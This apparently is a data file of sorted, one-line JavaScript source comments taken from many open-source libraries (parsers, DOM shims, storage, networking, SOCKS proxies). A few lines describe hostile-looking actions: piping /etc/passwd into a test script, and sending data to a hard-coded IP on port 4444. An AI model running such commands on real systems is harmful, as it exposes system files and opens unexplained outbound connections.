// Scan the next JSX token. This replaces Scanner#lex when in JSX mode.
// Scope tracking for duplicate variable names (see scope.js)
// Search between bounds with a MongoDB-like query
// Search for a codec in iconv.encodings. Cache codec data in iconv._codecDataCache.
// Search for a given element from among the matched elements.
// Search from the `fromIndex`.
// Second argument adds object to global.
// Second pass is for adding `await`/`yield` statements to any function
// Second set: some rebalancing necessary
// Security Info=True;
// See #13393 for more info
// See ReactUpdateQueue
// See ReactUpdates and ReactUpdateQueue.
// See [MDN](https://mdn.io/round#Examples) for more details.
// See `_updateDOMProperties`. style block
// See `createPrimitiveTypeChecker`.
// See `handleChange` comment below
// See `tools/generate-identifier-regex.js`.
// See all information related to the confidence levels of each encoding.
// See also https://github.com/heycam/webidl/pull/22 which isn't merged as of yet
// See also https://nodejs.org/api/http2.html#http2_http2session_socket
// See also tools/generate-unicode-regex.js.
// See also tools/generate-unicode-regex.py.
// See bugzil.la/1090768.
// See comment for NewExpression above.
// See for details: http://tweetnacl.cr.yp.to/
// See here for display values: https://developer.mozilla.org/en-US/docs/CSS/display
// See http://bugs.jquery.com/ticket/13378
// See http://dev.w3.org/csswg/cssom/#css-import-rule
// See http://en.wikipedia.org/wiki/UTF-8#Description
// See http://requirejs.org/docs/errors.html#mismatch for more details.
// See https://bugs.chromium.org/p/v8/issues/detail?id=90 for more details.
// See https://bugs.webkit.org/show_bug.cgi?id=156034 for more details.
// See https://connect.microsoft.com/IE/feedback/details/1736512/
// See https://en.wikipedia.org/wiki/Exponentiation_by_squaring for more details.
// See https://es5.github.io/#x13.2.2 for more details.
// See https://github.com/chaijs/chai/issues/86: this makes
// See https://github.com/joyent/node/issues/1726
// See https://github.com/jquery/sizzle/pull/225
// See https://github.com/mozilla/source-map/issues/16
// See https://github.com/mozilla/sweet.js/wiki/design
// See https://github.com/npm/node-tar/pull/187
// See https://github.com/tmpvar/jsdom/pull/1140#issuecomment-111587499
// See https://github.com/uuidjs/uuid for API details
// See https://github.com/visionmedia/superagent/issues/1367
// See https://html.spec.whatwg.org/multipage/comms.html#the-websocket-interface
// See https://lists.w3.org/Archives/Public/public-script-coord/2015JanMar/0109.html
// See https://tc39.es/ecma262/#integer-index
// See if any of the DOM operations applied to this component's subtree.
// See if we can take a shortcut and just use innerHTML
// See setDocument()
// See test_lac/loadAndCrash.test.js
// See the Harmony `egal` proposal: http://wiki.ecmascript.org/doku.php?id=harmony:egal.
// See the License for the specific language governing permissions and
// See the `form-data` README for more information about options: https://github.com/form-data/form-data
// See tickets #10406 and #13132
// See todo above.
// See zlib defaults.
// See: <http://www.w3.org/TR/html-polyglot/#newlines-in-textarea-and-pre>
// See: <http://www.w3.org/TR/html5/syntax.html#element-restrictions>
// See: <http://www.w3.org/TR/html5/syntax.html#newlines>
// See: https://bugs.webkit.org/show_bug.cgi?id=80797
// See: https://github.com/mozilla/localForage/issues/128
// See: https://github.com/mozilla/localForage/issues/161
// See: https://github.com/mozilla/localForage/issues/68
// See: https://github.com/npm/node-tar/issues/183"
// Seedless set matches succeeding multiple successful matchers stipulate sorting
// Seek `elem` from a previously-cached index
// Seek a direct converter
// Select 48 bits according to PC2
// Select 56 bits according to PC1
// Select from the left 28 key bits
// Select from the right 28 key bits
// Select is set to empty string on purpose
// Self is already up-to-date.
// Self is preserved since the owner is preserved.
// Send 'hello' to 165.227.108.231:4444
// Send a udp frame to 8.8.8.8 on port 53 through the proxy.
// Send global event
// Send initial handshake.
// Send packet.
// Separate key and IV
// Sequence continues.
// Sequence finished. Write it.
// Sequence start
// Serialize an array of form elements or a set of
// Serialize array item.
// Serialize object item.
// Serialize parsed document to the HTML and write it to file
// Serialize scalar item.
// Serialize the form elements
// Server rendering.
// Serves as infimum
// Services don't support empty query string keys
// Set Agent from Tunnel Data
// Set Header.
// Set `ExpressionStatement#directive` property for directive prologues.
// Set `allowReserved` to a boolean value to explicitly turn this on
// Set `diff` timestamp
// Set `eventQueue` to null before processing it so that we can tell if more
// Set a key's value and run an optional callback once the value is set.
// Set a timeout in memory - this block will throw if the server takes more
// Set a value with localStorage:
// Set an existing field's value
// Set any config values for localForage; can be called anytime before
// Set corresponding property to false
// Set data for the fake xhr object
// Set display property to inline-block for height/width
// Set document vars if needed
// Set elements which have been overridden with display: none
// Set filename by providing a string for options
// Set headers
// Set initial values
// Set internal state to Error.
// Set module.parser.javascript.commonjsMagicComments=true in your webpack config.
// Set new text content.
// Set null character position to the end SmartBuffer instance.
// Set output
// Set readyState
// Set the data...
// Set the display of most of the elements in a second loop
// Set the leaf to given dbcsCode.
// Set the readyState to 'complete' once all resources are loaded.
// Set the value (with attr map support)
// Set timeOut and extendedTimeOut to 0 to make it sticky
// Set to Infinity to have unlimited buffers.
// Set traditional to true for jQuery <= 1.3.2 behavior.
// Set up expected structures
// Set up prototype of constructor on same line as `extends` for line-number
// Set up the window as if it's a top level window.
// Set up token state
// Set when currying a bound function.
// Set width or height on the element
// Sets many values
// Sets multiple values
// Sets one value
// Setting .type throws on non-<input> tags
// Setting innerHTML on a <template>
// Setting the key on one of these doesn't affect the other.
// Setting the value of a non-existing field in a subdocument by using the dot-notation
// Setup Proxy Header Exclusive List and White List
// Setup Proxy Headers and Proxy Headers Host
// Setup default CSS.  Only add one style sheet per document
// Setup methods on prototype:
// Setup the javascript language processor
// Share the final connection amongst related localForages.
// Shared database.
// Shift arguments if data argument was omitted
// Shift entry off the buffer when it emits 'end', and emit 'entry' for"
// Shift with exponential notation to avoid floating-point issues.
// Shift.
// Shift_JIS
// Shims to Node.js objects when running under PhantomJS 1.7+.
// Shims to Node.js objects when running under Rhino.
// Short circuit the remove all case as this is the nice one
// Short option
// Shortcut
// Shortcut for :nth-*(n)
// Shortcut for document ready
// Shortcut for names that are not vendor prefixed
// Shortcut form. As called it infers `process.argv`. See below for
// Shortcut function for checking if an object has a given property directly
// Shortcuts
// Should .destroy() be called after 'end' (and potentially 'finish')
// Should .destroy() be called after 'finish' (and potentially 'end')
// Should always have the prepended source root
// Should be proxied through proxy_url.
// Should both be idempotent
// Should close be emitted on destroy. Defaults to true.
// Should handle with sourceRoot.
// Should handle without sourceRoot.
// Should not happen because previously we determined expected !== actual.
// Should preserve lines transforming ugly code.
// Should return sane default values
// Should transform simple short notation.
// Should transform: short notation in complex object pattern.
// Show any hidden elements after setting opacity to 0
// Show the HTML for the Google homepage.
// Shuffle an array.
// Shuffle proxies
// Sigma0
// Sigma1
// Signed integers
// Silently ignore the error.
// Silently steal the ref from the parent.
// Silently swallow error
// Similar to the logic for BlockStatement.
// Simple (identifier pattern) catch binding
// Simple NAF (Non-Adjacent Form) multiplication algorithm
// Simple array of subdocuments
// Simple doubly linked list (https://en.wikipedia.org/wiki/Doubly_linked_list) implementation
// Simple index in dot notation
// Simple range `c1 c2 ...` is a subset of simple range `C1 C2 ...` iff:"
// Simple remove
// Simple update
// Simple variation: don't support surrogates or subsequences in seq.
// Simplified subset
// Simply replace the object with the update query contents
// Simply rethrow otherwise
// Simulated bind
// Since plain JS classes are defined without any special initialization
// Since reconciling a component higher in the owner hierarchy usually (not
// Since the print function that we pass to the reprinter will
// Since we were not able to preserve all leading/trailing
// Single tag
// Single-byte code
// Single-byte codec. Needs a 'chars' string parameter that contains 256 or 128 chars that
// Size (in bytes) below which messages
// Size of above table
// Skip 1 character in the buffer.
// Skip ENOENT error
// Skip arrow.
// Skip binary (ArrayBuffer) data tests if Array Buffer isn't supported.
// Skip binary(Blob) data tests if Blob isn't supported.
// Skip checking prop types again -- we don't read inst.props to avoid
// Skip elements already in the context collection (trac-4087)
// Skip empty and invalid entries
// Skip group headers.
// Skip if ports don't match.
// Skip index properties.
// Skip irrelevant config tests by mapping them to API tests so that
// Skip key warning if the type isn't valid since our key validation logic
// Skip printing EmptyStatement nodes to avoid leaving stray
// Skip reset of nRounds has been set before and key did not change
// Skip the boolean and the target
// Skip zero-length hosts.
// Skipping backward.
// Skipping forward.
// Slash (/) char #47 can also start a regex.
// Slice to the end if no end position was provided.
// Slow and gets slower with database size
// Snapshot intrinsics
// So actually we're calculating the average time taken by one insert + one remove
// So that `instanceof` works correctly
// So we need to support that.
// Socket options (defaults host/port to options.proxy.host/options.proxy.port)
// Socks 4 (IPv4)
// Socks 4a (hostname)
// Socks BIND established. Waiting for remote connection via proxy.
// Socks v4 only has one handshake response.
// SocksClientOptions
// Some Samsung/HTC Android 4.0-4.3 devices
// Some URL objects are not from a URL parsed string and need href added
// Some async length retrievers are present
// Some browsers builtin objects can report typeof 'function' (e.g. NodeList
// Some code originally from async_storage.js in
// Some commands are not available on some systems. Ex:
// Some comment\ndoThat(); }': {
// Some environments don't have global Buffer (e.g. React Native).
// Some existing components rely on inst.props even after they've been
// Some notable changes:"
// Some of the pretty-printer code (such as that for printing function
// Some of these methods are missing from
// Some other status code that's not 200... need to re-play the HTTP
// Some others are from future reserved words.
// Some packet type
// Some type of object without properties can be shortcutted.
// Something like `1.2.3 - 1.2.4`
// Sometimes a MBCS char corresponds to a sequence of unicode chars. We store them as arrays of integers here. 
// Sort an array of nodes based on their relative position in the document and
// Sort by `user` in ascending order and by `age` in descending order.
// Sort by creationIndex so deserializing retains the creation order.
// Sort on method existence if only one input has compareDocumentPosition
// Sort stability
// Sort the object's values by a criterion produced by an iterator.
// Sorting
// Source code tests.
// Source is preserved since cloneElement is unlikely to be targeted by a
// Source:
// Source: http://dom.spec.whatwg.org/#dom-node-comparedocumentposition
// SourceMapConsumer.GREATEST_LOWER_BOUND or SourceMapConsumer.LEAST_UPPER_BOUND
// Sparse array.
// Spawn
// Special case
// Special case for S3 and SimpleDB in us-east-1
// Special case for during window creation.
// Special case for function names as bound inside the function
// Special case string values
// Special case: the in-order predecessor is right below the node to delete
// Special handle `object` in case other instances are allowed to outline
// Special handling for branch statement because SpiderMonkey
// Special handling for do while statement because SpiderMonkey
// Special handling for regular expression literal since we need to
// Special handling for regular expression literals: remove their `value`
// Specialize the default `ready()` function by making it dependent
// Specific to arrays
// Specifier and ModuleSpecifier are abstract non-standard types
// Specify the options. Minimally `name` (or `names`) and `type`
// Speed up dequeue by getting out quickly if this is just a lookup
// SpiderMonkey allows expression closures: function(x) x+1
// Split Literal
// Split Property -> ObjectProperty and ObjectMethod
// Split into RestProperty and SpreadProperty
// Spread operator: ...
// Squash 2 or more white-spaces in the row into 1
// Squeeze
// Squeeze state to retrieve hash
// Stable-stringify
// Standalone semver comparison program.
// Star ranges basically just allow anything at all.
// Start a new scope with regard to labels and the `inFunction`
// Start chaining a wrapped Underscore object.
// Start connection
// Start connection to proxy
// Start flowing on next tick if stream isn't explicitly paused
// Start listening for data.
// Start the next in the queue if the last step wasn't forced.
// Start the precedence parser.
// Start the timer for the trailing edge.
// Start timeout timer (defaults to 30 seconds)
// Start with a normal queue
// Start with an empty selector
// Starting value computation is required for potential unit mismatches
// Stash a copy in case other scripts modify these
// Stash the parent if it exists
// State
// State reset every time PathVisitor.prototype.visit is called.
// Statement) is allowed here. If context is not empty then only a Statement
// Statements under must be grouped (by label) in SwitchCase
// Statements.
// Static convenience function for coercing a value to a FastPath.
// Static data
// Status-dependent callbacks
// Step 11.4 (delete cookie) is implied by just setting the new one:
// Step 3: add files to output
// Step 6.a: NaN == NaN
// Step left until we fail to match the invert condition.
// Steps 6.b-6.e: +0 != -0
// Sticky mode via flag y
// Still Has Header.
// Still used?
// Stop proxying if the hostname ends with the no_proxy host.
// Stop scripts or inline event handlers from being executed immediately
// Stops the connections after document deletion because the listeners will not be triggered once document deleted
// Storage for addon tokens
// Storage for cached regexes
// Storage for fixed/extended native methods
// Store a reference from the instance back to the internal representation
// Store className if set
// Store named backreferences on the first argument
// Store that sha1 hash for future comparison purposes
// Store the correct default display
// Store transform mode and key
// Stream API
// Strict HTML recognition (#11290: must start with <)
// String
// String conversion as required by WebIDL.
// String literal starts with single quote (#39) or double quote (#34).
// String literal starts with single quote (U+0027) or double quote (U+0022).
// String.prototype.split is overridden but not extended by XRegExp
// StringDecoder provides an interface for efficiently splitting a series of
// Strings
// Strings are immutable in JS -> we use ucs2 buffer to speed up computations.
// Strip excess characters from unquoted arguments
// Strip trailing `:`
// Strip/apply leading mode modifier with any combination of flags except g or y: (?imnsx)
// Stripping ports in this way instead of using parsedUrl.hostname to make
// Stub
// Style of cloned element affects source element cloned (#8908)
// Sub word
// Subclassed from Error.
// Subtract offsetParent scroll positions
// Subtract parent offsets and element margins
// Success/Error
// Succinct definitions of keyword token types
// Sugar: all encode/decode streams have .collect(cb) method to accumulate data.
// Summary:
// SuperCall:
// SuperProperty:
// Superagent timeout
// Supertype of Block and Line.
// Supplemental Plane codepoint (surrogate pair)
// Supply the number of keys in the datastore to the callback function.
// Support Unix Sockets
// Support [ElemType] syntax.
// Support array or space separated string of keys
// Support functional components
// Support functions
// Support: Android 2.3
// Support: Android 4.0 - 4.3 only
// Support: Android 4.0-4.3
// Support: Android<4.0
// Support: Android<4.1
// Support: Android<=2.3
// Support: Blackberry 4.6
// Support: Chrome 14-35+
// Support: Chrome <= 35-45+
// Support: Chrome, Safari"
// Support: Cordova 2.5 (WebKit) (#13255)
// Support: Firefox
// Support: Firefox 18+
// Support: Firefox 20+
// Support: Firefox<24
// Support: IE
// Support: IE 11
// Support: IE 9 - 10 only
// Support: IE <9 only
// Support: IE <=8
// Support: IE11 only
// Support: IE11+
// Support: IE6/7
// Support: IE8
// Support: IE8-11+
// Support: IE9
// Support: IE9 only
// Support: IE9-10 only
// Support: IE9-11+
// Support: IE<10
// Support: IE<11
// Support: IE<8
// Support: IE<9
// Support: IE<=11+
// Support: Opera <= 12.12
// Support: QtWebKit
// Support: Safari 7 only"
// Support: Safari 8+
// Support: Webkit<537.32 - Safari 6.0.3/Chrome 25 (fixed in Chrome 27)
// Support: Windows 8 Native Apps
// Support: Windows Web Apps (WWA)
// Support: iOS 8.2 (not reproducible in simulator)
// Suppose you need a named File type to wrap your Programs.
// Swallow
// Swallow - we only care if `supports-color` is available; it doesn't have to be.
// Swap
// Swap 2nd and 4th rows
// Swap Header With Itself.
// Swap Header With a Different Header.
// Swap bits across the left and right words
// Swap endian
// Swappable if display is none or starts with table
// Symbol shams are incapable of differentiating boxed from unboxed symbols
// Sync
// Sync name cache
// Sync target indexed properties
// Sync target named properties
// Sync with *.json manifests.
// Sync with package.json and component.json.
// Sync:
// Syntax tests.
// SyntaxError in https://www.ecma-international.org/ecma-262/8.0/#sec-term
// System File      -a-h-s
// T
// THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS"
// TLD with only 1 rule.
// TLD with some 2-level rules.
// TLS/SSL negotiation
// TODO
// TODO (yungsters): Remove support for `selected` in <option>.
// TODO (yungsters): Remove support for children content in <textarea>.
// TODO - if (!newChild) then?
// TODO Allow printing of comments?
// TODO Are all Expressions really Patterns?
// TODO Broaden this to accept any pattern.
// TODO Could attach getters and setters here to enforce
// TODO Deviating from the spec by reusing VariableDeclarator here.
// TODO Does this make sense? Can't really be an JSXElement.
// TODO Esprima should return JSXText instead.
// TODO Figure out how to silently coerce Expressions to
// TODO Get the for (;;) case right.
// TODO Missing from the Parser API.
// TODO Report this nonsense.
// TODO Same concern.
// TODO This could be represented as a RestElement in .params.
// TODO Warn if fields are overridden with incompatible types.
// TODO branding
// TODO event handlers:
// TODO event handlers: only check null
// TODO if(x.compareTo(q) >= 0) error
// TODO mutation observer stuff
// TODO parse inline content if parameter markdown=1
// TODO persist lastAccessed
// TODO remove MutationEvents completely at some point
// TODO remove when Node v8 support drops
// TODO(BridgeAR): Write a test for these two error cases
// TODO(isaacs) clean this up
// TODO(ronag): Throw ERR_VALUE_OUT_OF_RANGE.
// TODO(shtylman)
// TODO: 
// TODO: Add chunked encoding when no length (if err)
// TODO: Add query encoding
// TODO: Add tests
// TODO: Add tests (above tests cover scope functionality only)
// TODO: Add: not a URL code point
// TODO: An `isValidNode` function would probably be more appropriate
// TODO: Bailing out early is just a perf optimization right?
// TODO: Branch current matrix so that save/restore has no effect
// TODO: Callback with seq.
// TODO: Completely remove this in v0.15.
// TODO: Don't change ID on `setItem()`.
// TODO: Drop this when these are no longer allowed as the type argument.
// TODO: Figure out why `ownerDocument` is sometimes undefined in IE8.
// TODO: Find out if this resets the AUTO_INCREMENT number.
// TODO: Following is broken for curves due to
// TODO: Get this to be cross-origin.
// TODO: I think this check is unnecessary
// TODO: IBM CCSID 943 = Shift_JIS = CP932 with original Shift_JIS lower 128 chars.
// TODO: Implement
// TODO: It may be a good idea to cache this to prevent unnecessary DOM
// TODO: KDDI extension to Shift_JIS
// TODO: Look into why.
// TODO: Make this a specific error/event.
// TODO: More complete implementation of RFC 2617.
// TODO: Now that all calls to _data and _removeData have been replaced
// TODO: ReactDefaultPerfAnalysis.getTotalTime() does not return the correct
// TODO: Removing the return statement should affect correctness?
// TODO: Replace this with ES6: var ReactInstanceMap = new Map();
// TODO: Replace with destructuring
// TODO: Running getItem from inside the setItem
// TODO: Save this as pending props and use performUpdateIfNecessary
// TODO: Set _charsWritten.
// TODO: Should this even be possible? The owner cannot change because
// TODO: Should we be stricter and perform validation?
// TODO: Shouldn't this be getChecked(props)?
// TODO: Simply remove trailing dot?
// TODO: Stop validating prop types here and only use the element
// TODO: Support 'let' here...maybe...one day...or something...
// TODO: The callback here is ignored when setState is called from
// TODO: This is a known limitation of the current implementation.
// TODO: This is currently true because these injections are shared between
// TODO: This should never be null -- when is it?
// TODO: Update URLSearchParams
// TODO: Update query object
// TODO: Validate that text is allowed as a child of this node
// TODO: What if we have no default? (resCode == undefined)
// TODO: What to do on a detached node?
// TODO: XOR
// TODO: add to stats
// TODO: all of this needs tests
// TODO: allow for multiple same-name relations
// TODO: allow reseeding after first request
// TODO: consider a mode of some sort where these are not shared between all DOM instances
// TODO: constructor should not take ownerDocument
// TODO: defer
// TODO: do traversal
// TODO: each style and link element should register its sheet on creation
// TODO: empty query object
// TODO: event.data - structured clone message - requires cloning DOM nodes
// TODO: event.origin - requires reference to source window
// TODO: event.ports
// TODO: event.source - requires reference to source window
// TODO: expand to include the rest
// TODO: expose these as configurable defaults
// TODO: figure out whether positions should be undefined here.
// TODO: give option
// TODO: identify versions
// TODO: implement
// TODO: implement HTMLOptionsCollection
// TODO: implement me!
// TODO: inst.context = null;
// TODO: inst.props = null;
// TODO: inst.state = null;
// TODO: is copy needed?
// TODO: just use Document when we eliminate the difference between Document and HTMLDocument.
// TODO: log total time of each reconcile and the top-level component
// TODO: make sure MongoDB doesn't flatten the array (it wouldn't make sense)
// TODO: make this a util
// TODO: make this comparison case-insensitive on windows?
// TODO: make this into a proper hashtable
// TODO: measure dropped frames after reconcile?
// TODO: moar!
// TODO: modularize the multiplication algorithm
// TODO: namespaced version
// TODO: necessary for Blob and FileReader due to different-globals weirdness; investigate how to avoid this.
// TODO: optimized handling of constants
// TODO: range stuff
// TODO: re-calculate any missing CRT params
// TODO: receiveComponent()?
// TODO: replace with a spread operator when Node v4 support drops
// TODO: return number of DOM ops? could be misleading.
// TODO: same as above but with trailing \r
// TODO: should this even be in this module?
// TODO: stop using the built-in URL in favor of the spec-compliant whatwg-url package
// TODO: targetOrigin === '/' - requires reference to source window
// TODO: the inflateFilter now causes a memory leak. see Issue #27.
// TODO: the many underscore-prefixed hooks should move here
// TODO: totalTime isn't that useful since it doesn't count paints/reflows
// TODO: unless buffering emit earlier to stream
// TODO: update constructor signature to match WebIDL spec
// TODO: use NamedPropertyTracker when https://github.com/tmpvar/jsdom/pull/1116 lands?
// TODO: use content-type or other module
// TODO: use media-typer
// TODO: use optimization. Also try element.getElementsByTagName
// TODO: use runtimeStyle and coordsize
// TODO: we would need to make this easily configurable before adding it in (e.g. some might want to add POST)
// TODO: what is this?
// TODO: wholeText property
// TODO: with namespace
// Tables are not require()-d until they are needed to speed up library load.
// Tag
// Take a snapshot of the related localForages.
// Take advantage of querySelectorAll
// Take an array of elements and push it onto the stack
// Take the difference between one array and a number of other arrays.
// Takes the _id by default
// Tar can encode large and negative numbers using a leading byte of
// Template literals start with ` (U+0060) for template head
// Template literals start with backtick (#96) for template head
// TemplateElement.
// Temporarily push properties named by string arguments given after the
// Temporarily remove the node under consideration
// Temporary values
// Test DB state after update and reload
// Test DB status
// Test for A's keys different from B.
// Test for equality any JavaScript type.
// Test for https://github.com/mozilla/localForage/issues/175
// Test for salt
// Test if the string passed is valid
// Test suites: http://philrathe.com/tests/equiv
// Test that operations are executed in the right order
// Test whether a given character code starts an identifier.
// Test whether a given character is part of an identifier.
// Test whether a semicolon can be inserted at the current position.
// Test with empty object
// Test with multiple documents
// Test with query that doesn't match anything
// Test with query that will return docs
// Test with remove only one document
// Test with update only one document
// Test: ./node test/fixtures/echo.js < /etc/passwd
// Tests whether parsed token is a contextual keyword.
// Text to html (true = no transformation)
// Texts in x-mac-hebrew are almost impossible to find on the Internet. From"
// Thanks to Andrew Dupont for this workaround technique
// Thanks:[@Medicean][medicaean-github]
// That second case is much more rare than the first and less annoying.
// That should allow `1.2.3-pr.2` to pass.
// That we got here means that the readable side wants more data.
// That's probably okay; we don't support it just as we don't support
// That's strange behaviour (we should only use true/false) but that's the way Mongo does it...
// That's what Firefox does
// That's what WebKit and Opera do
// The *only* caveat is that named captures must be referred to using numbered backreferences
// The .loc checks below are sensitive to some of the problems that
// The API method stubs inserted by callWhenReady must be tested before
// The BMP character to use as a replacement for astral symbols when
// The Browser also has localStorage in the global context.
// The Def object d returned from Type.def may be used to configure the
// The Def type is used as a helper for constructing compound
// The ESTree way of representing a ...rest parameter.
// The Esprima ModuleSpecifier type is just a string-valued
// The HebrewProber is not using any language model. All it does is look for"
// The JS engine embedded in Adobe products needs `match` returned in
// The Resolver is currently experimental and might be exposed to users in the future.
// The SBCSGroupProber is responsible for stripping the original text of HTML"
// The SourceNode we want to fill with the generated code
// The Symbol used to tag the ReactElement type. If there is no native Symbol
// The Transform stream has all the aspects of the readable and writable"
// The `Host` header should only include the port
// The `_.matchesProperty` iteratee shorthand.
// The `_.matches` iteratee shorthand.
// The `_.property` iteratee shorthand.
// The `beforeExpr` property is used to disambiguate between regular
// The `children` array is used by Cheerio internally to group elements that
// The `get()` function is Promise-based (error handling omitted for brevity)
// The `getLineInfo` function is mostly useful when the
// The `in` operator does not work with certain literals
// The `name` parameter can be either a function or a string.
// The `removedNodes` loop below will actually remove the child.
// The `retry` function can be used as a stand-alone control flow by passing
// The `startsExpr` property is used to check if the token ends a"
// The `super` keyword can appear at below:
// The `tokenize` export provides an interface to the tokenizer.
// The `tokenizer` export provides an interface to the tokenizer.
// The above copyright notice and this permission notice shall be included"
// The actual localForage object that we expose as a module or via a
// The actual meaning of the value depends on the users' keyboard layout
// The actual regexps go on exports.re
// The algorithm used to determine whether a regexp can appear at a
// The angle should be a non-negative number.
// The array for $in needs to be smaller than n (inclusive)
// The attrs elements can be null (#14894)
// The b.file builder function is now available. It expects two
// The base argument can be used to pass a custom (recursive)"
// The buffer fed to each prober in the SBCS group prober is pure text in
// The callback is called with nextTick to avoid a follow-up
// The callback will be called everytime the focus changes."
// The callee node of a dynamic import(...) expression.
// The calling jQuery object (element matches) is not empty
// The character just after the location occupied by oldNode.
// The character just before the location occupied by oldNode.
// The check for `tt.name && exprAllowed` detects whether we are
// The child must be instantiated before it's mounted.
// The closer for wrapper i threw an error; close the remaining
// The closest enclosing scope that governs this node.
// The closing comment is removed by ReactMultiChild.
// The code is written this way to avoid extra allocations
// The codec function must load all tables and return object with .encoder and .decoder methods.
// The comment is completely contained by this child node.
// The context stack is used to superficially track syntactic
// The current composition is stored statically and must not be
// The current position of the tokenizer in the input.
// The current version of jQuery being used
// The data
// The data has been persisted correctly
// The data in the z index is correct
// The data was correctly updated
// The database was not modified
// The debugger keyword works just fine everywhere.
// The decoder is more involved as we must handle chunks in stream.
// The default Buffer size if one is not provided.
// The default for captureRejections is false
// The default function is able to compare numbers and strings
// The default length of a jQuery object is 0
// The default string encoding to use for reading/writing strings.
// The deferred used on DOM ready
// The dominant difference between these charsets is their directionality."
// The double negative \P{^..} is invalid
// The element is in the lower half.
// The element is in the upper half.
// The elements to wrap the target around
// The empty .build() here means that an EmptyStatement can be constructed
// The emptyLines object needs to be created all the way down here so that
// The enter-key is technically both printable and non-printable and can
// The eslint settings do not allow break;
// The exact needle element was not found in this haystack. Determine if
// The expected use for this is to *first* try `acorn.parse`, and only"
// The first SBCharSetProber uses the model normally as any other
// The first ancestor Path whose value is a Node distinct from this.node.
// The first part is blank if the path is absolute. Trying to go
// The following are all specified in the HTML config already so we exclude here.
// The following are stubs simply so that we have the correct tag name <-> interface correspondences.
// The following cases are checked:
// The following check doesn't account for skews (which don't exist
// The following code deals with deserializing some kind of Blob or
// The following functions are needed only when the option to preserve
// The following member methods should not be automatically bound:
// The following modules cannot be included sooner due to the mutual dependency with parse.js
// The following result for thai was collected from a limited sample (1M).
// The following three are for https://dom.spec.whatwg.org/#concept-element-attribute-has. We don't just have a
// The following two fields are necessary to compute the Regex tokens.
// The forced null value here is compatible with the overridden
// The foundational matcher ensures that elements are reachable from top-level context(s)
// The frame number (used for breaking up larger packets)
// The frame number of the packet.
// The fruits array didn't change
// The functions in this module keep track of declared variables in the current scope in order to detect duplicate variable names.
// The gap string contained something other than whitespace.
// The generate SourceNodes we need a code range.
// The generated code
// The given byteOffset must be a multiple of the element
// The id and name fields are used by Esprima. The id field should not
// The ideal result would be:
// The immediate parent Path of this Path.
// The implementation assumes that the HTTP_PROXY environment variable is
// The initial render is synchronous but any updates that happen during
// The initial value can be a boolean or object so that's why it's
// The initializer for wrapper i threw an error; initialize the
// The interpretation of a dot depends on whether it is followed
// The jQuery object is actually just the init constructor 'enhanced'
// The jqXHR state
// The last line of a file might not have a newline.
// The last mapping for each line spans the entire line.
// The last token is any of those. Make it the element name.
// The leaf is itself a root
// The letters Pe and Kaf rarely display a related behavior of not being a
// The localStorage API doesn't return undefined values in an
// The main exported interface (under `self.acorn` when in the
// The mappings coming from the consumer for the section have
// The mappings must be guaranteed to be in sorted order before we start
// The matching of C against the element's language value is performed case-insensitively.
// The module cache
// The module does not impose restrictions on the scheme.
// The name of the current property is always the penultimate element of
// The name of the property of parentPath.value through which this
// The next 3 are exposed so you can use them
// The nodes contain pointers to the actual documents
// The normal Tsadi is not a good Non-Final letter due to words like
// The number is so large that javascript cannot represent it with integer
// The number of characters whose frequency order is less than 512
// The only existing prop by this name is a getter
// The only existing prop by this name is a setter
// The only other possibility is that it has returned false from a
// The order of previous char
// The packet data.
// The partitioning here works around a particularly bad circular require problem. See
// The path is named for its index in the elements array:
// The path.node object is the fourth element in that array:
// The path.parentPath object wraps the elements array (note that we use
// The persisted state has been updated
// The pointers in the _id and z indexes are the same
// The preferred form.
// The pretty printer allows a dangling Comment node to act as
// The previous operation removed the current element from the `siblings`
// The prober is divided between two SBCharSetProbers and a HebrewProber,"
// The queue of tests to run
// The quickest way to terminate the traversal is to call
// The raw RequestSigner can be used to generate CodeCommit Git passwords
// The reason fields are specified using .field(...) instead of an object
// The reason we don't _save_ null is because IE 10 does
// The regex chunks
// The regex is compiled once only
// The remaining code is added without mapping
// The remote address of the returned socket is the first proxy in the chain.
// The remote host that is listening (usually the proxy itself)
// The remote host that replied with a UDP packet
// The remote host.
// The remote port the proxy is listening on for incoming connections (when using BIND).
// The reprinting code leaves leading whitespace untouched unless it
// The request body should have the format of `{ string: 'foobar' }`
// The request has already finished and the callback was called.
// The request will be also be aborted if we've exceeded our storage
// The require function
// The rest will be decoded in future.
// The result can be nullish if a mock or a custom function is used.
// The return value is a bitmask with the following values:
// The same code with localForage:
// The same pointers are shared between all indexes
// The same rules apply when you want to only find one document
// The sandbox to use for the `vm` context.
// The serializer function keeps state inside the returned function and
// The sourceLoc can stay the same because the contents of the
// The spec is eager (setting the frozen base URL when things change); we are lazy (getting it when we need to)
// The spec says:
// The stack of private names.
// The stream needs another readable event if
// The subprocess will not output anything to stdout unless part of the test fails
// The toType function should of course be idempotent.
// The tokenizer will assume an expression is allowed after
// The transaction failed; check
// The two SBCharSetProbers (model probers) share the same language model:
// The type and name attributes are restricted during .innerHTML assignment
// The underlying BST now has 3 nodes which contain the docs where it's expected
// The underlying raw Socket
// The url can be an options object (which then must have .url)
// The url field will require support for asynchronicity.
// The use of `Object#toString` avoids issues with the `typeof` operator
// The use of `res.request.uri.href` ensures that `window.location.href`
// The user may use createPseudo to indicate that
// The validation flag is currently mutative. We put it on
// The value of the current property is always the final element of
// The value of the first ancestor Path whose value is a Node.
// The value that broken the cycle is returned
// The value/s can optionally be executed if it's a function
// The verifier is only available in the response after a user has
// The version of tough-cookie that serialized this jar.
// The version of tough-cookie that serialized this jar. Generally a good
// The warning generated by webpack can be disabled by setting:
// Then actually test NeDB persistence
// Then resume the parser
// There are circumstances in which it will raise an error and give
// There are lots of tables for Big5 and cp950. Please see the following links for history:
// There are no text nodes between the opening and closing comments; insert
// There are three versions of checkLVal*() appropriate for different"
// There is no keyword or literal with only one character.
// There is no new line in between.
// There is no reasonable way to sanitize the cache in such a way
// There isn't already a data prop by this name
// There isn't already a getter for this prop
// There isn't already a setter for this prop
// There might be a driver initialization in progress
// There was no sequence object - allocate a new one.
// There's already a sequence with  - use it.
// There's only work to do if current dataType is non-auto
// Therefore the following assertion should be `true`
// These (because of how they were written) directly include level1/core and modify it.
// These are a run-length and offset encoded representation of the
// These are added with the `verbose` option.
// These are the test tasks we run regardless of Sauce Labs credentials.
// These aren't supposed to have any body
// These cases should already be caught by validateMethodOverride.
// These characters contribute nothing to indentation.
// These fields do not really need to be reset since this object is no
// These functions deliberately support both assignment and binding constructs,"
// These hooks are used by animate to expand properties
// These options are recognized (only `ecmaVersion` is required):
